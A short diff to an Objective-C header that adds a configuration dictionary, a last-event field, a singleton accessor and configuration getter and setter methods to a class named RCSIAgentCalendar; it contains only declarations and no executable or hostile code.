@@ -9,5 +9,15 @@
 #import <Foundation/Foundation.h>
 
 @interface RCSIAgentCalendar : NSObject
+{
+@public
+  NSMutableDictionary *mAgentConfiguration;
+  long                mLastEvent;
+}
+
++ (RCSIAgentCalendar *)sharedInstance;
+
+- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
+- (NSMutableDictionary *)mAgentConfiguration;
 
 @end
